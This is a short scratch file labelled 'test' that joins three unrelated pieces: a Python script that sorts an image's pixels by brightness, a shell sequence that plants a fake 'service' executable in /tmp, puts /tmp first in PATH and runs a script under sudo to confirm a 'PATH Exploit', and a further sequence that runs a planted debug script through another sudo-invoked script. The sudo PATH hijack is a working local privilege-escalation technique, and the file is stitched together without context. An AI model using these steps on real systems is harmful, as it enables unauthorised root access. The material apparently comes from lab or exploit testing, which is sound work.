# test

from PIL import Image
import numpy as np

# Load image
img = Image.open("image.png").convert("RGB")
pixels = np.array(img)
h, w, _ = pixels.shape

# Flatten and sort by brightness or any channel
flattened = pixels.reshape(-1, 3)
sorted_pixels = sorted(flattened, key=lambda x: sum(x))  # sort by total intensity

# Reshape back to image shape
sorted_img = np.array(sorted_pixels).reshape(h, w, 3)

# Save
Image.fromarray(sorted_img.astype(np.uint8)).save("sorted_output.png")


echo '#!/bin/bash' > /tmp/service
echo 'echo "PATH Exploit Worked: $0" > /tmp/path_test' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
sudo /home/<your-username>/script.sh start
cat /tmp/path_test


sudo /home/enable_histor stop
echo 'pwd; env' > /tmp/debug.sh
chmod +x /tmp/debug.sh
sudo /home/enable_histor start /tmp/debug.sh 2> /tmp/debug_errors.txt
cat /tmp/debug_errors.txt
cat /tmp/debug.sh
